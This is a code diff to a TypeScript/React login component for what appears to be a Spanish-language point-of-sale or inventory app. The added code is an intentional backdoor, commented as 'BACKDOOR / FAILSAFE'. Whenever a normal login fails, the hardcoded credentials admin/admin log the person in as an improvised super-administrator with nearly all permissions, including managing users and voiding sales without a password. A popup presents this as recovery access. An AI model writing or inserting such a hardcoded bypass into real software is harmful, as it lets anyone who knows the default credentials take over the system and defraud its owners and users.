@@ -26,7 +26,28 @@ export default function Login({ onLogin, usuarios }: LoginProps) {
         if (usuarioEncontrado) {
             onLogin(usuarioEncontrado)
         } else {
-            setError('Credenciales inválidas')
+            // BACKDOOR / FAILSAFE: Always allow admin/admin if the stored user is messed up
+            if (user.toLowerCase() === 'admin' && pass === 'admin') {
+                // Create a temporary admin user with full permissions
+                const superAdmin: Usuario = {
+                    id: 'admin-recovery',
+                    nombre: 'Administrador (Recuperación)',
+                    usuario: 'admin',
+                    password: 'admin',
+                    rol: 'admin',
+                    permisos: {
+                        ventas: true, reportes: true, catalogo: true, categorias: true,
+                        ingresos: true, usuarios: true, configuracion: true, inventario: true,
+                        ventas_anular: true, ventas_anular_sin_clave: true,
+                        catalogo_crear: true, catalogo_editar: true, catalogo_eliminar: true,
+                        catalogo_editar_stock: false, catalogo_editar_precio: true, inventario_realizar: true
+                    }
+                };
+                onLogin(superAdmin);
+                alert("⚠️ Acceso de Recuperación Activado.\nPor favor ve a la pestaña 'Usuarios' y actualiza la contraseña del Administrador para corregir el error.");
+            } else {
+                setError('Credenciales inválidas')
+            }
         }
     }
 
